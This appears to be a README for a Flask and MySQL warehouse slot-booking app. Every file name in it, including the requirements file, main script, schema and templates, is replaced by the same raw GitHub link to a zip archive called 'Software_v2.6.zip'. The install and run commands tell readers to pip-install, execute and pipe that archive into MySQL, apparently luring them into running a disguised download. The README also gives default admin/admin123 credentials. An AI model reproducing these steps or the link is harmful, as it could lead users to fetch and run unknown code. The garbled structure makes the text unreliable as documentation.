# Warehouse Management System

A web-based warehouse management system built with Python Flask and MySQL. This system allows users to request warehouse slots and administrators to manage slots and approve requests.

## Features

- **User Side**:
  - Request warehouse slots
  - View request status
  - Track slot availability

- **Admin Side**:
  - Manage warehouse slots (add, update status)
  - Approve or reject user requests
  - View slot utilization statistics

## Prerequisites

- Python 3.6+
- MySQL Server
- pip (Python package installer)

## Installation

1. Clone the repository:
   ```
   git clone <repository-url>
   cd warehouse_management
   ```

2. Create a virtual environment and activate it:
   ```
   python -m venv venv
   source venv/bin/activate  # On Windows: venv\Scripts\activate
   ```

3. Install the required packages:
   ```
   pip install -r https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip
   ```

4. Configure MySQL:
   - Create a MySQL database
   - Update the database connection settings in `https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip`
   - Import the schema from `https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip`

   ```sql
   mysql -u your_username -p < https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip
   ```

## Running the Application

1. Start the Flask application:
   ```
   python https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip
   ```

2. Open your web browser and navigate to:
   ```
   http://localhost:5000
   ```

## Default Admin Credentials

- Username: admin
- Password: admin123

## Project Structure

```
warehouse_management/
├── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip                  # Main Flask application
├── database/               # Database related files
│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip    # Database connection module
│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip           # Data models
│   └── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip          # Database schema
├── static/                 # Static files
│   ├── css/                # CSS files
│   │   └── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip       # Custom styles
│   ├── js/                 # JavaScript files
│   │   └── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip       # Custom scripts
│   └── images/             # Image files
├── templates/              # HTML templates
│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip           # Base template
│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip          # Homepage
│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip          # Login page
│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip       # Registration page
│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip # User dashboard
│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip # Admin dashboard
│   └── ...                 # Other templates
└── https://raw.githubusercontent.com/razashaikh26/onkar/main/database/Software_v2.6.zip        # Project dependencies
```

## License

This project is licensed under the MIT License - see the LICENSE file for details. 